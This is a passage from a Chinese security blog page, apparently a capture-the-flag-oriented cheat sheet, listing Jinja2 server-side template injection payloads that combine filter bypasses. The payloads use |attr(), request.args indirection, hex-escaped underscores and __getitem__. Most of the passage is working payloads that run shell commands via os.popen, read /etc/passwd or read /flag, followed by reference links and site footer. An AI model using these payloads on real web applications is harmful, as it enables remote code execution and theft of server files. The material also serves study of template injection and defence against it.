+<span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="p">[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="组合绕过">组合绕过</h2>
+<h3 id="--">. + []</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__class__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__base__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__subclasses__&#34;</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__init__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__globals__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="__-">__ +.+[]</h3>
+<p>原payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>用 <code>__getitem__()</code>来绕过</p>
+<p>由于还过滤了下划线 <code>__</code>，我们可以用request对象绕过，但是还过滤了中括号 <code>[]</code>，所以我们要时绕过 <code>__</code>和 <code>[</code>，就用到了我们的<code>|attr()</code></p>
+<p>最后</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x1</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x2</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x3</span><span class="p">)()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x5</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x6</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x7</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x8</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x9</span><span class="p">)}}</span><span class="o">&amp;</span><span class="nx">x1</span><span class="o">=</span><span class="no">__class__</span><span class="o">&amp;</span><span class="nx">x2</span><span class="o">=</span><span class="nx">__base__</span><span class="o">&amp;</span><span class="nx">x3</span><span class="o">=</span><span class="nx">__subclasses__</span><span class="o">&amp;</span><span class="nx">x4</span><span class="o">=</span><span class="nx">__getitem__</span><span class="o">&amp;</span><span class="nx">x5</span><span class="o">=</span><span class="nx">__init__</span><span class="o">&amp;</span><span class="nx">x6</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">x7</span><span class="o">=</span><span class="nx">__builtins__</span><span class="o">&amp;</span><span class="nx">x8</span><span class="o">=</span><span class="k">eval</span><span class="o">&amp;</span><span class="nx">x9</span><span class="o">=</span><span class="nx">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="heading-2">&lsquo;+&quot;</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="o">.</span><span class="nx">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">path</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="nx">path</span><span class="o">=/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="_-1">_+'+&quot;</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">class</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">subclasses</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="nx">class</span><span class="o">=</span><span class="nx">_class__</span><span class="o">&amp;</span><span class="nx">mro</span><span class="o">=</span><span class="nx">_mro__</span><span class="o">&amp;</span><span class="nx">subclasses</span><span class="o">=</span><span class="nx">__subclasses__</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="_--">_ +. +&rsquo;</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="no">__class__</span><span class="p">}}</span>
+<span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="p">[</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x5f</span><span class="se">\\</span><span class="s2">x5fclass</span><span class="se">\\</span><span class="s2">x5f</span><span class="se">\\</span><span class="s2">x5f&#34;</span><span class="p">]}}</span>
+ 
+<span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="p">[</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x5f</span><span class="se">\\</span><span class="s2">x5fclass</span><span class="se">\\</span><span class="s2">x5f</span><span class="se">\\</span><span class="s2">x5f&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x5F</span><span class="se">\\</span><span class="s2">x5Fbases</span><span class="se">\\</span><span class="s2">x5F</span><span class="se">\\</span><span class="s2">x5F&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x5F</span><span class="se">\\</span><span class="s2">x5Fsubclasses</span><span class="se">\\</span><span class="s2">x5F</span><span class="se">\\</span><span class="s2">x5F&#34;</span><span class="p">]()[</span><span class="mi">91</span><span class="p">][</span><span class="s2">&#34;get</span><span class="se">\\</span><span class="s2">x5Fdata&#34;</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
+<span class="c1">#也就是
+</span><span class="c1"></span><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">91</span><span class="p">]</span><span class="o">.</span><span class="nx">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="参考文章">参考文章</h1>
+<p><a href="https://xz.aliyun.com/t/7746" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/7746</a>
+</p>
+<p><a href="https://xz.aliyun.com/t/9584" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/9584</a>
+</p>
+<p><a href="https://www.freebuf.com/articles/network/258136.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/articles/network/258136.html</a>
+</p>
+<p><a href="https://hoad-sc.blog.csdn.net/article/details/113778233" target="_blank" rel="noopener noreffer">https://hoad-sc.blog.csdn.net/article/details/113778233</a>
+</p>
+<p><a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/6885</a>
+</p>
+<p><a href="https://www.freebuf.com/articles/web/264088.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/articles/web/264088.html</a>
+</p>
+<p><a href="http://h0cksr.xyz/archives/340" target="_blank" rel="noopener noreffer">http://h0cksr.xyz/archives/340</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-09-19</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/qwb2022/" class="prev" rel="prev" title="[2022强网杯] WP"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[2022强网杯] WP</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
